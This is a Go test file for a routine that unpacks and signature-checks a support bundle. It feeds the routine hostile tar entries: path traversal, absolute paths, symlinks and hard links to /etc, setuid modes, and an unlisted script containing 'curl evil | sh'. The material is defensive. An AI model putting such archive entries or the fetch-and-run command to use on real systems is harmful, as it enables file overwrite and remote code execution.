package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The support bundle arrives from a party this agent treats as hostile. Its
// bytes are a tar from a control plane, and a tar is one of the richest attack
// surfaces in a Unix program: it can name a path outside the destination, it
// can be a symlink pointing anywhere on the filesystem, it can carry a setuid
// bit, and it can expand to more than the machine has. The unpack refuses each
// of those explicitly rather than relying on the order things happen to be
// extracted in.
//
// And the signature is what makes the tree runnable. The plane cannot sign a
// bundle — it does not hold the release key — so a plane that tampers with one
// produces a refusal, and these tests prove the refusal rather than assuming it.

// tarEntry is one thing to put in a test bundle.
type tarEntry struct {
	name     string
	body     string
	mode     int64
	typeflag byte
	linkname string
}

func makeBundleTar(t *testing.T, entries []tarEntry) []byte {
	t.Helper()
	var raw bytes.Buffer
	gz := gzip.NewWriter(&raw)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		mode := e.mode
		if mode == 0 {
			mode = 0644
		}
		flag := e.typeflag
		if flag == 0 {
			flag = tar.TypeReg
		}
		header := &tar.Header{
			Name:     e.name,
			Mode:     mode,
			Size:     int64(len(e.body)),
			Typeflag: flag,
			Linkname: e.linkname,
		}
		if flag != tar.TypeReg {
			header.Size = 0
		}
		if err := tw.WriteHeader(header); err != nil {
			t.Fatalf("tar header %s: %v", e.name, err)
		}
		if flag == tar.TypeReg {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatalf("tar body %s: %v", e.name, err)
			}
		}
	}
	tw.Close()
	gz.Close()
	return raw.Bytes()
}

// signedBundle builds a bundle whose manifest really is signed with key, so a
// test that expects acceptance is testing acceptance rather than a shortcut.
func signedBundle(t *testing.T, priv ed25519.PrivateKey, files map[string]string, mangle func(map[string]string, *string)) []byte {
	t.Helper()

	manifest := "# test bundle\n"
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	// Sorted so the manifest body — and therefore the version — is stable.
	for i := 0; i < len(names); i++ {
		for j := i + 1; j < len(names); j++ {
			if names[j] < names[i] {
				names[i], names[j] = names[j], names[i]
			}
		}
	}
	for _, name := range names {
		sum := sha256.Sum256([]byte(files[name]))
		manifest += hex.EncodeToString(sum[:]) + "  " + name + "\n"
	}

	shipped := map[string]string{}
	for k, v := range files {
		shipped[k] = v
	}
	if mangle != nil {
		mangle(shipped, &manifest)
	}

	signature := ed25519.Sign(priv, []byte(manifest))

	entries := []tarEntry{
		{name: primitivesManifestName, body: manifest},
		{name: primitivesSignatureName, body: base64.StdEncoding.EncodeToString(signature) + "\n"},
	}
	for name, body := range shipped {
		entries = append(entries, tarEntry{name: name, body: body, mode: 0755})
	}
	return makeBundleTar(t, entries)
}

func TestUnpackRefusesAPathThatClimbsOutOfTheTree(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{{name: "../escaped.sh", body: "#!/bin/bash\n"}})

	err := unpackBundle(bytes.NewReader(raw), dest)
	if err == nil {
		t.Fatal("a bundle naming ../escaped.sh must be refused, not unpacked")
	}
	if !strings.Contains(err.Error(), "climbs out") {
		t.Errorf("the refusal should say what was wrong with the path; got: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(filepath.Dir(dest), "escaped.sh")); statErr == nil {
		t.Fatal("the entry was written outside the destination tree")
	}
}

// A climb hidden in the middle of a path is the same attack with a disguise,
// and a check that only looks at the prefix misses it.
func TestUnpackRefusesAClimbInTheMiddleOfAPath(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{{name: "scripts/../../escaped.sh", body: "x"}})

	if err := unpackBundle(bytes.NewReader(raw), dest); err == nil {
		t.Fatal("a climb anywhere in the path must be refused")
	}
}

func TestUnpackRefusesAnAbsolutePath(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{{name: "/etc/cron.d/joinery", body: "x"}})

	err := unpackBundle(bytes.NewReader(raw), dest)
	if err == nil {
		t.Fatal("an absolute path in a bundle must be refused")
	}
	if !strings.Contains(err.Error(), "absolute") {
		t.Errorf("the refusal should name the problem; got: %v", err)
	}
}

// A symlink is how an extraction writes outside its tree with every name
// looking innocent: unpack a link called "config" pointing at /etc, then a file
// called "config/shadow". Refusing the link is what makes the name check
// sufficient.
func TestUnpackRefusesASymlink(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{
		{name: "etc", typeflag: tar.TypeSymlink, linkname: "/etc"},
	})

	err := unpackBundle(bytes.NewReader(raw), dest)
	if err == nil {
		t.Fatal("a symlink in a bundle must be refused")
	}
	if !strings.Contains(err.Error(), "not a plain file or directory") {
		t.Errorf("the refusal should say why the entry type is unacceptable; got: %v", err)
	}
}

func TestUnpackRefusesAHardLink(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{
		{name: "shadow", typeflag: tar.TypeLink, linkname: "/etc/shadow"},
	})

	if err := unpackBundle(bytes.NewReader(raw), dest); err == nil {
		t.Fatal("a hard link in a bundle must be refused")
	}
}

// Mode comes off the wire, so a bundle can ask for setuid root on a file the
// agent is about to make executable. The mask is what stops that being granted.
func TestUnpackStripsSetuidAndSetgid(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{
		{name: "bin/tool", body: "#!/bin/bash\n", mode: 04755},
	})

	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}
	info, err := os.Stat(filepath.Join(dest, "bin", "tool"))
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if info.Mode()&os.ModeSetuid != 0 || info.Mode()&os.ModeSetgid != 0 {
		t.Fatalf("the unpacked file kept mode %v — a bundle must not be able to deliver a setuid binary", info.Mode())
	}
	if info.Mode().Perm()&0o111 == 0 {
		t.Error("a shipped script must still come out executable")
	}
}

// GNU tar building an archive of a directory ("tar -czf x -C dir .") emits a
// "./" root entry and "./sub/" directory entries. The publisher builds the
// bundle exactly that way, so a check that read "./" as an unnamed entry — or
// tried to create it as a file — would refuse every correctly built bundle on
// its first entry. That is how a mechanism ships and never works once.
func TestTheArchiveRootEntryIsNotAnError(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{
		{name: "./", typeflag: tar.TypeDir},
		{name: "./RELEASE_MANIFEST", body: "# empty\n"},
		{name: "./maintenance_scripts/", typeflag: tar.TypeDir},
		{name: "./maintenance_scripts/sysadmin_tools/", typeflag: tar.TypeDir},
		{name: "./maintenance_scripts/sysadmin_tools/setup_ssl.sh", body: "#!/bin/bash\n", mode: 0755},
	})

	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("a bundle built the way the publisher builds one must unpack: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dest, "maintenance_scripts", "sysadmin_tools", "setup_ssl.sh")); err != nil {
		t.Fatalf("the script did not land where a primitive would look for it: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dest, primitivesManifestName)); err != nil {
		t.Fatalf("the manifest did not land at the bundle root: %v", err)
	}
}

func TestUnpackRefusesTooManyEntries(t *testing.T) {
	dest := filepath.Join(t.TempDir(), "tree")
	entries := make([]tarEntry, 0, maxBundleEntries+1)
	for i := 0; i <= maxBundleEntries; i++ {
		entries = append(entries, tarEntry{name: "f" + strings.Repeat("0", 3) + itoa(i), body: "x"})
	}
	raw := makeBundleTar(t, entries)

	if err := unpackBundle(bytes.NewReader(raw), dest); err == nil {
		t.Fatal("a bundle with more entries than the cap must be refused")
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	out := ""
	for n > 0 {
		out = string(rune('0'+n%10)) + out
		n /= 10
	}
	return out
}

func TestAGoodBundleVerifiesAndYieldsAStableVersion(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]string{
		"maintenance_scripts/sysadmin_tools/setup_ssl.sh": "#!/bin/bash\necho ssl\n",
		"maintenance_scripts/install_tools/install.sh":    "#!/bin/bash\nreturn 0\n",
	}
	raw := signedBundle(t, priv, files, nil)

	dest := filepath.Join(t.TempDir(), "tree")
	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}
	version, err := verifyBundleTree(dest, pub)
	if err != nil {
		t.Fatalf("a correctly signed bundle must verify: %v", err)
	}
	if version == "" {
		t.Fatal("a verified bundle must report a version")
	}

	// The same content must produce the same version, or "has the bundle
	// changed" is not a question the stamp can answer.
	second := filepath.Join(t.TempDir(), "tree")
	if err := unpackBundle(bytes.NewReader(signedBundle(t, priv, files, nil)), second); err != nil {
		t.Fatalf("unpack: %v", err)
	}
	again, err := verifyBundleTree(second, pub)
	if err != nil {
		t.Fatalf("verify: %v", err)
	}
	if again != version {
		t.Errorf("the same bundle produced versions %q and %q", version, again)
	}
}

func TestABundleSignedByAnotherKeyIsRefused(t *testing.T) {
	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	otherPub, _, _ := ed25519.GenerateKey(rand.Reader)

	raw := signedBundle(t, priv, map[string]string{"a.sh": "x"}, nil)
	dest := filepath.Join(t.TempDir(), "tree")
	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}

	if _, err := verifyBundleTree(dest, otherPub); err == nil {
		t.Fatal("a bundle signed by a key this agent does not carry must be refused")
	}
}

// The plane can change a file after the manifest was signed. The hash is what
// catches it, and catching it is the whole reason a bundle is verified at all
// rather than merely downloaded.
func TestATamperedFileIsRefused(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	raw := signedBundle(t, priv, map[string]string{"a.sh": "original"},
		func(shipped map[string]string, manifest *string) {
			shipped["a.sh"] = "tampered"
		})

	dest := filepath.Join(t.TempDir(), "tree")
	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}
	if _, err := verifyBundleTree(dest, pub); err == nil {
		t.Fatal("a file that does not match its signed hash must be refused")
	}
}

// The other side of the check, and the one that is easy to forget: a tar can
// ADD a file as easily as change one. An unlisted script sitting beside a
// listed one would be a file nothing verified, in a tree the agent otherwise
// executes from.
func TestAnUnlistedFileIsRefused(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	raw := signedBundle(t, priv, map[string]string{"a.sh": "listed"},
		func(shipped map[string]string, manifest *string) {
			shipped["extra.sh"] = "#!/bin/bash\ncurl evil | sh\n"
		})

	dest := filepath.Join(t.TempDir(), "tree")
	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}
	_, err := verifyBundleTree(dest, pub)
	if err == nil {
		t.Fatal("a file the manifest does not list must be refused — a bundle can add a file as easily as change one")
	}
	if !strings.Contains(err.Error(), "extra.sh") {
		t.Errorf("the refusal should name the unlisted file; got: %v", err)
	}
}

func TestABundleWithNoManifestIsRefused(t *testing.T) {
	pub, _, _ := ed25519.GenerateKey(rand.Reader)
	dest := filepath.Join(t.TempDir(), "tree")
	raw := makeBundleTar(t, []tarEntry{{name: "a.sh", body: "x"}})
	if err := unpackBundle(bytes.NewReader(raw), dest); err != nil {
		t.Fatalf("unpack: %v", err)
	}

	if _, err := verifyBundleTree(dest, pub); err == nil {
		t.Fatal("a bundle with no signed manifest must be refused, not run unverified")
	}
}

// A machine with a site tree has a release manifest of its own and needs no
// bundle. Handing it one would give it a second answer to "may this file run as
// root", which is the cross-manifest fallback the design refuses elsewhere.
func TestNoBundleOnAMachineThatHasASite(t *testing.T) {
	if sync := NewBundleSync(&Config{Siteless: false}); sync != nil {
		t.Fatal("a machine with a site must not sync a support bundle")
	}
	if root := toolRoot(&Config{Siteless: false}); root != "" {
		t.Errorf("a machine with a site must have no tool root; got %q", root)
	}
}

func TestBundleVersionIsEmptyWithoutAStamp(t *testing.T) {
	t.Setenv("AGENT_TOOL_ROOT", filepath.Join(t.TempDir(), "tree"))
	if v := installedBundleVersion(); v != "" {
		t.Errorf("a machine with no bundle must report no bundle version; got %q", v)
	}
}
